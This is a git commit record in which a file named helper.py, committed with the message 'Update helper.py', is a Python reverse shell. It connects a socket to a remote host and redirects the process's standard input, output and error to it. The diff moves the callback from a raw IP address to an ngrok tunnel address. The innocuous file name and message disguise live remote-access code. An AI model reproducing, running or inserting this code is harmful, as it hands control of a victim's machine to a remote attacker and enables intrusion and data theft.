a3a71eaf54a6acaed343beb110ac516676105606
Boic <73367117+Boic69@users.noreply.github.com>
2021-11-22 09:10:17 +0100

    Update helper.py

--- helper.py
+++ helper.py
@@ -1,7 +1,7 @@
 import os, subprocess, socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("80.212.111.82", 8888))
+s.connect(("2.tcp.eu.ngrok.io", 17155))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
